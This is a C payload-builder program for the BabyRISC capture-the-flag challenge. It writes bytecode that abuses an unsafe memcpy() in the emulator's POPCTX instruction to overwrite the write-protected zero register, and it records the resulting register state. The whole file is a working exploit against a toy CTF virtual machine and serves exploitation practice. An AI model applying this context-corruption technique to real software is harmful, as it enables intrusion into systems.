/* Pwn builder for BabyRISC challenge.
 * This is a modified version of the builder provided in the task files
 * 
 * The goal: Bypass the ZERO_REGISTER write restriction using the unsafe memcpy() in the POPCTX instruction implementation
 * 
 * Result:
 * (gdb) p registers
 * $16 = {-41, 1, 0, 0, 0, 0, 0, 0, 0}
 * 
 */
#include <stdio.h>
#include "asm_file_generation.h"
#include "common.h"

#define TERMINATE_MARKER_UINT32 (0xfffffffful)

int main(void)
{
    int ret = E_SUCCESS;
    FILE * payload_fp = NULL;

    payload_fp = fopen("pwn.bin", "w");
    if (payload_fp == NULL)
    {
        printf("\nPayload builder code error!\n");
        ret = E_FOPEN;
        goto cleanup;
    }

    // Pwn starts here
    ret |= file_write_opcode_imm32(payload_fp, SUBI, ASM_REGISTER_R0, ASM_REGISTER_ZERO, (int32_t)41);  // REG_ZERO (after we POPCTX)
    ret |= file_write_opcode_imm32(payload_fp, ADDI, ASM_REGISTER_R1, ASM_REGISTER_ZERO, (int32_t)0x1); // REG_R0   (after we POPCTX)
    ret |= file_write_opcode_imm32(payload_fp, ADDI, ASM_REGISTER_R2, ASM_REGISTER_ZERO, (int32_t)0x0); // REG_R1   (after we POPCTX)
    ret |= file_write_opcode_imm32(payload_fp, ADDI, ASM_REGISTER_R3, ASM_REGISTER_ZERO, (int32_t)0x0); // REG_R2   (after we POPCTX)
    ret |= file_write_opcode(payload_fp, PUSHCTX);                                                      // Pushing registers context
    ret |= file_write_opcode1(payload_fp, PUSH, (asm_register_t)ASM_REGISTER_R2);                       // Do some stack shifting a little bit to make the POPCTX restore a corrupted context structure  
    ret |= file_write_opcode(payload_fp,  (asm_opcode_t)POPCTX);                                        // Using POPCTX, trigger the unsafe memcpy() and overwrite the ZERO_REG
    ret |= file_write_opcode3(payload_fp, XOR, ASM_REGISTER_R2, ASM_REGISTER_R2, ASM_REGISTER_R2);      // zero-ing out REG_R2 because the admin bytecode uses it after the user bytecode is executed
                                                                                                         
    if (ret != E_SUCCESS)
    {
        ret = E_FWRITE;
        goto cleanup;
    }

    // Terminate the payload so BabyRISC will know where to stop reading
    uint32_t terminate_marker = TERMINATE_MARKER_UINT32;
    if (fwrite(&terminate_marker, sizeof(terminate_marker), 1, payload_fp) != 1)
    {
        ret = E_FWRITE;
        goto cleanup;
    }

    // Calculate amount of bytes written
    long offset = ftell(payload_fp);
    if (offset == -1)
    {
        ret = E_FTELL;
        goto cleanup;
    }

    // Success
    printf("Written %ld bytes to 'pwn.bin'.\n", offset);

cleanup:
    if (payload_fp != NULL)
    {
        fclose(payload_fp);
    }
    return ret;
}
